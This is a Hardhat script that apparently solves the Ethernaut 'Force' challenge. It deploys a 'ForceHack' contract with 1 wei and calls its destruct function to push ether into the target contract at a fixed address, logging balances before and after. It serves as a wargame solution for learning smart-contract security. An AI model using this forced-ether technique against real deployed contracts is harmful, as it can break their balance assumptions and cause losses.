// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
    const INSTANCE_ADDRESS = '0x7FA28A0dD6051da3b5D89bBf06d75C560EdA88cf';
    const [owner, addr1] = await ethers.getSigners();

    const Force = await hre.ethers.getContractFactory("Force");
    const ForceHack = await hre.ethers.getContractFactory("ForceHack");

    // const force = await Force.deploy();
    // await force.deployed()
    // console.log(await ethers.provider.getBalance(force.address));

    const force = Force.attach(INSTANCE_ADDRESS);
    
    const forceHack = await ForceHack.deploy({ value: 1 });
    await forceHack.deployed()
    console.log(await ethers.provider.getBalance(forceHack.address));

    const tx = await forceHack.destruct(force.address);
    await tx.wait();
    console.log(await ethers.provider.getBalance(force.address));

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
